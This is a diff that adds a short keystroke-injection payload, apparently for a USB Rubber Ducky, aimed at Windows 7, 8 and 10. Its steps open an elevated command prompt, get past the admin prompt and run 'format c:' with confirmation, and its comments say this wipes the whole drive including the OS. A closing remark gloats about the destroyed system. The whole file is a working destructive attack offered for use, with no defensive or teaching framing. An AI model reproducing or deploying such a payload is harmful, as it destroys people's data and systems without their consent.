@@ -1,0 +1,15 @@
+REM I AM NOT RESPONSIBLE FOR ANYTHING YOU DO. Works on Windows 7, 8 and 10. This deletes everything on the hard drive, including the OS. 
+GUI r
+DELAY 500
+cmd
+CTRL SHIFT ENTER
+DELAY 500
+ENTER
+format c:
+DELAY 500
+ENTER
+DELAY 500
+y
+Delay 500 
+ENTER
+REM System is now destroyed! Have fun explaining that one! :) 
